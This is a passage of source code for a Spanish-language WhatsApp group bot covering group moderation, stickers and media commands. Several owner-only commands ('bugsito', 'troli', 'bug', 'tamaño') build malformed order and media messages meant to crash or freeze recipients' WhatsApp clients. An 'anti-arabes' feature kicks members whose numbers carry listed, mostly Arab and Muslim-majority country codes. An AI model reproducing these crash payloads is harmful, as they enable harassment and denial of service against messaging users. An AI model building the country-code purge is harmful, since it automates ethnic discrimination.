        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Voto* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}	
        if (!vin.key.fromMe && banChats === true) return



if (vin.message.buttonsResponseMessage){
    sadb = vin.message.buttonsResponseMessage.selectedButtonId
if (isBan) return
    if (sadb.includes(`${prefix}ABRIR GRUPO`)){
        kev.groupSettingChange(from, GroupSettingChange.messageSend, false)
      reply('GRUPO ABIERTO')
    }
}

if (vin.message.buttonsResponseMessage){
    sadb = vin.message.buttonsResponseMessage.selectedButtonId
if (isBan) return
    if (sadb.includes(`${prefix}CERRAR GRUPO`)){
    kev.groupSettingChange(from, GroupSettingChange.messageSend, true)
      reply('GRUPO CERRADO')
    }
}

if (vin.message.buttonsResponseMessage){
    sadb = vin.message.buttonsResponseMessage.selectedButtonId
    if (sadb.includes(`${prefix}info`)){
thanks = `*Thanks to the following people:*

*🔖 「 VideFrelan 」 🔖*

*Apis Server Builder and Host, Command Configurator and General Help.*

User information:
Github: https://github.com/VideFrelan
WhatsApp: *@${sendv.split("@s.whatsapp.net")[0]}*


*🔖 「 Aiden 」 🔖*

*Vps host, command switch and General Help.*

User information:
Github: https://github.com/iamaidend
WhatsApp: *@${senda.split("@s.whatsapp.net")[0]}*


*🔖 「 Manurios 」 🔖*

*Constant modifier, Apis host and General Help.*

User information:
Github: https://github.com/ManuriosX
Instagram: https://instagram.com/manuuuriosss_
WhatsApp: *@${sendm.split("@s.whatsapp.net")[0]}*


*🔖 「 Diosamuel 」 🔖*

*Functional stickers configurator and General Help.*

User information:
Github: https://github.com/diosamuel
WhatsApp: *@${sends.split("@s.whatsapp.net")[0]}*


*And thanks to other people for helping me to correct some errors of my bot, I thank you... ❤️*`
res2 = await kev.prepareMessageFromContent(from, {
"orderMessage": { 
"orderId": "2430318063779164",
"status": "INQUIRY",
"orderTitle": "Keͥ͢vͣıͫ͘͜𝜂",
"sellerJid": "35058145555@s.whatsapp.net",
"token": "AR47CbQM0Pv6nAhnATZB0gSnSad1+nqouOfplFJk/DBmJQ==",
"itemCount": -66666666, 
"message": thanks, 
"footerText": `POKEMON`,
 "thumbnail": fakeimg, 
"surface": 'CATALOG', 
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true}}}, {quoted:faketroli,sendEphemeral: true, contextInfo:{ mentionedJid: [sendv, senda, sendm, sends]}})
             kev.relayWAMessage(res2)
    }
}

if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${senderfix.split("@")[0]} enviar mensaje hidetag`, "white")
      );
      kev.sendMessage(from, `Acabo de detectar que enviaste un hidetag... @${senderfix.split("@")[0]}.....!!`, MessageType.text, {contextInfo: {mentionedJid: [senderfix]}});
      kick(from, senderfix)
    }
if (isGroup && isAntilink && !vin.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return
        kev.groupRemove(from, [sender]);
      }
    }
/*if (isGroup && m.mtype == 'viewOnceMessage'){
			if (antionce === false) return
			var msg = {...vin}
			msg.message = vin.message.viewOnceMessage.message
			msg.message[Object.keys(msg.message)[0]].viewOnce = false
			kev.copyNForward(from, msg, {caption : 'FIU'})
			}*/
if (vin.message.listResponseMessage){
    sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
    if (sadb.includes(`${prefix}anti-arabes activar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (isKickarea) return reply("Ya estaba activado!!");
if (isAntiArabes) return kev.sendMessage(from,`*El AntiArabes ya esta activado.*`, MessageType.text, fakevin)
antiarabes.push(from)
fs.writeFileSync('./src/antiarabes.json', JSON.stringify(antiarabes))
kev.sendMessage(from,`*[📌] El AntiArabes ha sido activado con éxito, eliminare cada árabe que entre a el grupo.*

Aquí una lista de los números agregados:

+92
+91
+98
+94
+93
+971
+968
+212
+966
+994
+213
+218
+216
+20
+229
+213
+62
+48
+90
+967
+222
+249
+963`, MessageType.text, fakevin)
await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
}
}
if (vin.message.listResponseMessage){
sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
if (sadb.includes(`${prefix}anti-arabes desactivar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
antiarabes.splice(from, 1)
fs.writeFileSync('./src/antiarabes.json', JSON.stringify(antiarabes))
kev.sendMessage(from,`*[📌] El AntiArabes ha sido desactivado con éxito.*`, MessageType.text, fakevin) 
await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
}
}
// ANTI ARABES

// ANTI EXTRANJEROS
if (vin.message.listResponseMessage){
sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
if (sadb.includes(`${prefix}anti-ex activar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (isAntiFake) return kev.sendMessage(from,`*El AntiExtranjeros ya esta activado.*`, MessageType.text, fakevin)
antifake.push(from)
fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))
kev.sendMessage(from,`*[📌] El AntiExtranjeros ha sido activado con éxito.*`, MessageType.text, fakevin)
await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
}
}
if (vin.message.listResponseMessage){
sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
if (sadb.includes(`${prefix}anti-ex desactivar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
antifake.splice(from, 1)
fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))
kev.sendMessage(from,`*[📌] El AntiExtranjeros ha sido desactivado con éxito.*`, MessageType.text, fakevin) 
await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
}
}
// ANTI EXTRANJEROS

// MENSAJE DE BIENVENIDA
if (vin.message.listResponseMessage){
sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
if (sadb.includes(`${prefix}bien-venida activar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (isWelkom) return kev.sendMessage(from,`*El mensaje de bienvenida ya esta activo en este grupo.*`, MessageType.text, fakevin)
welkom.push(from)
fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
kev.sendMessage(from,`*[📌] El mensaje de bienvenida ha sido activado exitosamente.*`, MessageType.text, fakevin)
 await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
}
}
if (vin.message.listResponseMessage){
    sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
    if (sadb.includes(`${prefix}bien-venida desactivar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
welkom.splice(from, 1)
fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
kev.sendMessage(from,`*[📌] El mensaje de bienvenida ha sido desactivado exitosamente.*`, MessageType.text, fakevin)
await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
}
}
// MENSAJE DE BIENVENIDA

// ANTI ENLACE
if (vin.message.listResponseMessage){
    sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
    if (sadb.includes(`${prefix}antie-nlace activar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (isAntilink) return reply("*El AntiEnlace Ya esta activado*");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("*[📌] El AntiEnlace ha sido activado exitosamente.*!");
await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
}
}
if (vin.message.listResponseMessage){
    sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
    if (sadb.includes(`${prefix}antie-nlace desactivar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          kev.sendMessage(from,`*[📌] El AntiEnlace ha sido desactivado exitosamente.*`, MessageType.text, fakevin)
await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
}
}
// ANTI ENLACE
// ANTI ONCE
if (vin.message.listResponseMessage){
    sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
    if (sadb.includes(`${prefix}anti-once activar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
antionce = true
kev.sendMessage(from,`*[📌] El AntiViewonce ha sido activado con éxito.*`, MessageType.text, fakevin)
}
}
if (vin.message.listResponseMessage){
sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
if (sadb.includes(`${prefix}anti-once desactivar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
antionce = false
kev.sendMessage(from,`*[📌] El AntiViewonce ha sido desactivado con éxito.*`, MessageType.text, fakevin) 
}
}
// ANTI ONCE
// ANTI DELETE
if (vin.message.listResponseMessage){
    sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
    if (sadb.includes(`${prefix}anti-delete activar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
        antidel = true
        kev.sendMessage(from,`*[📌] El AntiDelete ha sido activado con éxito.*`, MessageType.text, fakevin)
    }
}
if (vin.message.listResponseMessage){
    sadb = vin.message.listResponseMessage.singleSelectReply.selectedRowId
if (isBan) return
    if (sadb.includes(`${prefix}anti-delete desactivar`)){
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
     antidel = false
     kev.sendMessage(from,`*[📌] El AntiDelete ha sido desactivado con éxito.*`, MessageType.text, fakevin) 
    }
}
// ANTI DELETE
//
if (vin.message.listResponseMessage){
    devian = vin.message.listResponseMessage.singleSelectReply.selectedRowId
    if (devian.includes(`${prefix}masinfo`)){
if (isBan) return
                                    const { Client } = require("youtubei");
                                    const youtube = new Client();
                                    const getytlink = devian.replace(`${prefix}masinfo `, "")
                                    const video = await youtube.getVideo(getytlink);
                                    console.log(video)
                                    lels = `*🗃️「 INFORMACIÓN SOBRE EL VIDEO 」🗃️*
                                    
                                    
*•🛸 Título :* ${res[0].judul}

*• 📤 Subido el:* ${video.uploadDate}

*• 🎞️ Vistas:* ${video.viewCount}

*• 🕰️ Duracion:* ${ms(Number(video.duration + '000'))}

*• 🧰 Canal:* ${video.channel.name}

*• 💫 Tags:* ${video.tags}

*• 👍🏼 Likes:* ${video.likeCount}

*• 👎🏼 Dislikes:* ${video.dislikeCount}

*• 📝 Descripcion:*

${video.description}`
lol1 = video.thumbnails.length
lol2 = lol1 - 1
alel = await getBuffer((video.thumbnails[lol2].url))
kev.sendMessage(from, alel, image, {quoted: vin, caption :lels, thumbnail : alel})
}}
// SWITCH STICKERS
/*if (vin.message.stickerMessage) {
            let stickerKey = vin.message.stickerMessage.fileSha256.toString('hex');
            if(stickerKey=="4de2ae0892671fc73b2fe7a8b556b44b87342f8fdc7a1b0b3cdddec241d2df3b"){
            await kev.groupRemove(msg.key.remoteJid, [vin.message.stickerMessage.contextInfo.participant])
        }
        }*/
//

switch (stickerscomm) {
/*case '1be7f8a3d67fe6262c63f802c456d8706f0adc178899961c3caee4871d902e0e':
            if (!isGroup && !vin.key.fromMe)return
            await kev.groupRemove(vin.key.remoteJid, [vin.message.stickerMessage.contextInfo.participant])
break*/
//
case '72a294a5cd385f8e63c425b0345126a483ec5a6dd48eef8bfc4dc895549feb91':
            if (!isGroup && !vin.key.fromMe)return
                reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
                  let temp4 = {
                key:vin.key,
                message:vin.message.stickerMessage.contextInfo.quotedMessage
                                                                               }
                const meidiaedu = await kev.downloadAndSaveMediaMessage(temp4, `./sticker/${senderfix}`)

                const edusito = {
        type: 'full',
        pack: `𒋡⸸𒑱𝐸᷏𐓱᷏ͨ𝝁᷏ͩ𐎓ᷡ龺꯭🍁`,
        author: 'Edu reborn. 🍁🪐',
        categories: [
            '🌹'
        ]
    }
      const edusito2 = await createSticker(`./sticker/${senderfix}.webp`, edusito)
                  kev.sendMessage(from, edusito2, MessageType.sticker, {quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                  fs.unlinkSync(meidiaedu)
            break
}
// SWITCH STICKERS
switch (command) {


case 'bugsito': 
if (!isOwner && !yo) return
kev.sendMessage(vin.key.remoteJid, '👾BUG VIRUS BY KEVIN👾', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: 'Kevin Te Destruye',
    orderTitle: 'BY KEVIN ', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
kev.toggleDisappearingMessages(from,`ERROR`,text)
break


case 'wasted':
case 'wanted':
case 'utatoo':
case 'magik':
case 'blur':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
     if (isQuotedImage) {
     reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
     pp = await kev.getProfilePicture(sender).catch(_ => 'https://telegra.ph/file/6ea2baa958c1d4c68fb73.png')
   thumbnya = await getBuffer(pp)
     boij = JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
     delb = await kev.downloadAndSaveMediaMessage(boij, `./media/${sender}.png`)
     data = await imgbb(imgb, delb)
     anuk = `${data.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     kev.sendFile(from, imoj, `${sender}.png`, null, vin, {thumbnail: thumbnya})
     } else {
      reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
    ghost = vin.message.extendedTextMessage.contextInfo.participant || vin.message.extendedTextMessage.contextInfo.mentionedJid[0]
    pp = await kev.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
    mediaax = await getBuffer(pp)
    datae = await imageToBase64(JSON.stringify(pp).replace(/\"/gi, ''))
    fs.writeFileSync('janckuk.jpeg', datae, 'base64')
    data = await imgbb(imgb, 'janckuk.jpeg')
    anuk = `${data.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     kev.sendFile(from, imoj, `${sender}.png`, null, vin, {thumbnail: mediaax})
     }
     break

case 'getmencion':
               try {
                 quotedCaption = vin.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption
                reply(quotedCaption)
                } catch {
                reply('Menciona una imagen que contenga un texto debajo..!')
                }
          break
case 'troli':
kev.sendMessage(from, `🛒`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
          message: {
                               orderMessage: {
                                 itemCount: 99999999,
                                   status: 1,
                                  surface: 10,
                                 orderTitle: 'Lo Siento Por Matarte....',
                              sellerJid: '0@s.whatsapp.net'
                               }
                               }
                               }
                               }, 0)         
break
          case 'ghb': 
          case 'githubbusqueda': 
          case 'ghbusqueda':
              if (!q) return reply('Que deseas buscar??')
              res = await fetch('https://api.github.com/search/repositories?q='+q)
              json = await res.json()
              if (res.status !== 200) throw json
              str = json.items.map((repo, index) => {
              return `--------------------------------------
 

 *🧇 「 Github Busqueda 」 🧇*

 *🧇 ${1 + index}. ${repo.full_name}*${repo.fork ? ' (fork)' : ''}

 *🧇 Enlace:* ${repo.html_url}

 *🧇 Creación Fecha:* ${formatDate(repo.created_at)}

 *🧇 Última Actualización:* ${formatDate(repo.updated_at)}

 *🧇 Vistas:* ${repo.watchers}

 *🧇 Ramas:* ${repo.forks}

 *🧇 Estrellas:* ${repo.stargazers_count}

 *🧇 Cuestiones:* ${repo.open_issues} ${repo.description ? `

 *🧇 Descripción:*
\n${repo.description}` : ''}

 *🧇 Clonar Git:* \`\`\`$ git clone ${repo.clone_url}\`\`\`
`.trim()
}).join('\n\n')
              reply(str)
              break
          case 'bug':
          case '.':
              if (!yo && !isOwner) return
              try {
              quotedText = vin.message.extendedTextMessage.contextInfo.quotedMessage.conversation
              sendBug(from, `${quotedText}`)
              sendBug(from)
              sendBug(from)
              sendBug(from)
              sendBug(from)
              sendBug(from)
              } catch {
              sendBug(from)
}
break
        case 'añadircmd': 
        case 'setcmd':
              if (!yo && !isOwner) return
              if (isQuotedSticker) {
              if (!arg) return reply(`Menciona un sticker mas el comando: ${command} mas el comando que quieres que haga.`)
              var kodenya = vin.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, arg)
              reply("*[📌] El sticker ha sido agregado a la lista de CMD*")
              } else {
              reply('*tienes que mencionar un sticker...*')
}
              break
       case 'delcmd':
       case 'eliminarcmd':
              if (!yo && !isOwner) return
              if (!isQuotedSticker) return reply(`Para eliminar un sticker solo mencionalo junto al comando: ${command}`)
              var kodenya = vin.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
             _scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
              reply("*[📌] El sticker ha sido eliminado de la lista de CMD*")
              break
       case 'listcmd':
       case 'listacmd':
              if (!isGroup && !vin.key.fromMe)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
              teksnyee = `*🧇「 L̷i̷s̷t̷a̷ D̷e̷ S̷t̷i̷c̷k̷e̷r̷s̷ C̷M̷D̷ 」🧇*`
              cemde = [];
              for (let i of _scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n*𝕷⃝🧇 ∙ ID:* _${i.id}_\n*𝕷⃝🧇 ∙ Comando:* _${i.chats}_`
}
              mentions(teksnyee, cemde, true)
              break
case 'tamaño':
if (!isGroup && !vin.key.fromMe)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!q) return reply(`Por favor escribe un número para aumentar el tamaño del sticker... ejemplo: ${prefix}tamaño 999999`)
filsize = q
costick = await kev.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:vin})
kev.relayWAMessage(costick)
break
case 'tamañov':
if (!isGroup && !vin.key.fromMe)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!q) return reply(`Por favor escribe un número para aumentar el tamaño del video... ejemplo: ${prefix}tamañov 999999`)
filsizee = q
fvideot = await kev.prepareMessageFromContent(from,{
"videoMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsizee,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:vin})
kev.relayWAMessage(fvideot)
break
case 'fiu':
const firu = (q + "@s.whatsapp.net")
kev.sendMessage(from, `@${firu.split("@s.whatsapp.net")[0]}`, MessageType.text, {quoted: vin, contextInfo: {mentionedJid: [firu]}})
break
case 'setprefix':
if (!yo && !isOwner) return 
if (!q) return reply('Elige que prefix quieres ponerle a tu bot')
prefix = q
reply(`El nuevo prefix es: ${q}`)
break
case 'sancion':
if (!yo && !isOwner && !isTumor) return 
mentioned = vin.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
addBanned(mentioned[0], args[1], ban)
}
mentions(`@${mentioned[0].split('@')[0]} Ahora estas sancionado por incumpir con las reglas del bot, esto significa que no podras usar ningun comando del bot.!`, mentioned, true)
} else if (isQuotedMsg) {
shad = vin.message.extendedTextMessage.contextInfo.quotedMessage
//vin.message.stickerMessage.contextInfo.quotedMessage.conversation
addBanned(vin.key.remoteJid, args[1], ban)
mentions(`@${mentioned[0].split('@')[0]} Ahora estas sancionado por incumpir con las reglas del bot, esto significa que no podras usar ningun comando del bot.!`, mentioned, true)
} else if (!isNaN(args[1])) {
addBanned(args[1] + '@s.whatsapp.net', args[2], ban)
mentions(`@${mentioned[0].split('@')[0]} Ahora estas sancionado por incumpir con las reglas del bot, esto significa que no podras usar ningun comando del bot.!`, mentioned, true)
}
break
                
case 'unsancion':
if (!yo && !isOwner && !isTumor) return 
mentioned = vin.message.extendedTextMessage.contextInfo.mentionedJid
shad = vin.message.extendedTextMessage.contextInfo.quotedMessage
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
unBanned(mentioned[i], ban)
}
mentions(`@${mentioned[0].split('@')[0]} Usuario desbaneado!!`, mentioned, true)
}if (isQuotedMsg) {
unBanned(vin.key.remoteJid, ban)
mentions(`@${mentioned[0].split('@')[0]} Usuario desbaneado!!`, mentioned, true)
} else if (!isNaN(args[0])) {
unBanned(args[0] + '@s.whatsapp.net', ban)
mentions(`@${mentioned[0].split('@')[0]} Usuario desbaneado!!`, mentioned, true)
}
break
case 'sancionados':
if (!yo && !isOwner) return 
        ben = '```Lista De Sancionados``` :\n'
          for (let banned of ban) {
            ben += `~> @${banned.split('@')[0]}\n`
          }
          ben += `Total: ${ban.length}`
          kev.sendMessage(from, ben.trim(), MessageType.extendedText, {quoted: vin, contextInfo: {"mentionedJid": ban}})
break
case 'banchat':
case 'pausar':
if (!yo && !isOwner && !isTumor) return 
if (args.length < 1) return reply('Para activar usa *si* y para desactivar *no*')
if ((args[0]) === 'si') {
if (isBanChat) return reply('Ya el bot esta ignorando este chat!')
chatban.push(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
reply('*Bot pausado en este grupo.*')
} else if ((args[0]) === 'no') {
chatban.splice(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
